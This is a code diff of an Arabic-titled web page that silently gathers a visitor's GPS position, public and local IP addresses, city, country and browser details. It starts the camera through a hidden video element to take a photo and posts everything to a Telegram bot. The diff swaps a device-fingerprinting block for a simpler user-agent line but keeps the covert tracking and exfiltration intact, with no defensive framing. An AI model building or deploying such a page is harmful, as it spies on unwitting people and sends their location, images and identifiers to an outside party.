@@ -3,7 +3,6 @@
 <head>
   <meta charset="UTF-8">
   <title>📍 تحديد + تصوير + IPs</title>
-  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1/dist/ua-parser.min.js"></script>
 </head>
 <body>
   <video id="video" autoplay playsinline style="display:none;"></video>
@@ -23,25 +22,6 @@
     let city = "";
     let country = "";
     let flagEmoji = "";
-    let deviceInfo = "";
-
-    function getDeviceInfo() {
-      const parser = new UAParser();
-      const res = parser.getResult();
-      const device = res.device;
-      const os = res.os;
-      const browser = res.browser;
-      const cores = navigator.hardwareConcurrency || "❓";
-      const mem = navigator.deviceMemory || "❓";
-      const screenRes = `${screen.width}x${screen.height}`;
-      deviceInfo = `🧠 معلومات الجهاز:
-📱 الجهاز: ${device.vendor || ""} ${device.model || ""} (${device.type || "غير معروف"})
-🧩 النظام: ${os.name || ""} ${os.version || ""}
-🌐 المتصفح: ${browser.name || ""} ${browser.version || ""}
-📟 الشاشة: ${screenRes}
-💾 الرام: ${mem} GB
-🧮 أنوية المعالج: ${cores}`;
-    }
 
     function sendPhoto(blob) {
       const form = new FormData();
@@ -54,6 +34,7 @@
     }
 
     function sendCombinedMessage() {
+      const browser = navigator.userAgent;
       const message = `📡 معلومات الجهاز:
 
 📍 الموقع (GPS):
@@ -65,9 +46,9 @@ ${gpsMsg || "❌ فشل تحديد الموقع"}
 🏙️ المدينة: ${city || "❌"}
 🌍 الدولة: ${country ? `${country} ${flagEmoji}` : "❌"}
 
-🗺️ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}
+🌐 المتصفح: ${browser}
 
-${deviceInfo}`;
+🗺️ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
       document.getElementById("result").innerText = message;
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
@@ -166,7 +147,6 @@ Longitude: ${gpsLon}
     }
 
     function initCamera() {
-      document.getElementById("result").innerText += "\n📸 يتم الآن التقاط صورة...";
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           const video = document.getElementById("video");
@@ -186,8 +166,7 @@ Longitude: ${gpsLon}
         });
     }
 
-    // تشغيل كل شيء
-    getDeviceInfo();
+    // بدء كل العمليات
     getLocation();
     getPublicIP();
     getLocalIP();
